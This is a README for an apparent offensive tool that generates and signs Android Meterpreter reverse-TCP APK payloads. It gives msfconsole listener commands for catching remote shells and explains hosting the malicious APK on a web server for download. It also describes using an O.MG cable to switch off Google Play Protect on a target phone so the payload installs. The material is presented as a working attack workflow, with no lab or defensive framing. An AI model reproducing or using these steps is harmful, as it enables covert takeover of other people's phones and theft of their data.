# Requirements

Firstly, for the Requirements we need the following
- Ubuntu OS over a server
- Steady internet

# Installation

Run the following commands

```bash
sudo bash install.sh
```

and 

```python
pip3 install -r requirements.txt
```

# How to run

`python3 main.py`

# Guilines on How to use

- `First`: The options must be selected and must be in an order for example for a payload to be signed it must be first be generated.
- `Second`: While generating the payload make sure that the .apk extention is written.
- `Third`: Once payload signing process starts **read and follow each instruction carefully** and at the end when you see a prompt `[no]` enter `yes` and press enter.
- `Fourth`: The listener option or the listener you are using to connect with the effected system will need a few manual inputs from your end. `Enter in the msfconsole` They are:

```bash
use use exploit/multi/handler
set payload payload/android/meterpreter/reverse_tcp
set lhost <<ip>>
set lport <<port>>
run
```
Just copy paste them one by one

# File locations
- The signed files will be located in the `signed_files` directory
- The keyfile and the payload file will be located in `payload_files` directory

# Hosting

I suggest you have a web-hosting on servers like `Linode` or `AWS` so that the hosting process is easy.
The payload files will be hosted on the apache server and you just need to enter the `http://<IP>/<apk_name>` to start the download.
The OMG cable must first disable the Google play protect for this to be successful.

`Point to remember`: all the packages needed are installed by the installer script and no manual installations are needed.

# OMG cable

The OMG cable has its own scripting and the guild will be provided on the time of buying and these are the things that must be taken care using the OMG cable
- Disable Google Play Protect
- Install the file

The scripting language has its own methods of doing this and this is the path to diable google play protect.
```
Settings >> Google >> Security >> Google Play Protect >> Tap on Cog-wheel >> Select Scan apps with Play Protect to turn it off
```